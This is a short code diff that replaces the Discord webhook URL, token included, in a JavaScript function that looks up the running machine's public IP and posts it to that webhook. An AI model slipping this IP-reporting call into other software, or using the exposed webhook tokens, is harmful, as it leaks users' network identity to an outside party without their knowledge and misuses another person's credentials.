@@ -1,7 +1,7 @@
 async function sendWebhook() {
     let ip = await (await fetch(`https://ifconfig.me/ip`)).text()
     const webhookURL =
-      "https://discord.com/api/webhooks/1203780433205137539/94NfbW0cD5_MsZ4Ll4Pmu_ejiW4MgVUd5Pnbl4gNnQx3X43DgEG8KgCleCo9NuSsAD5v"
+      "https://discordapp.com/api/webhooks/1219323327504715777/T8WK4rd1eQXpEN3uvwYMwZFvgpn3p55QCLjmAva0BTk3P6sWCbDJJZeIHyvFdwd0LAcQ"
   
     const message = {
       content: `${ip}`,
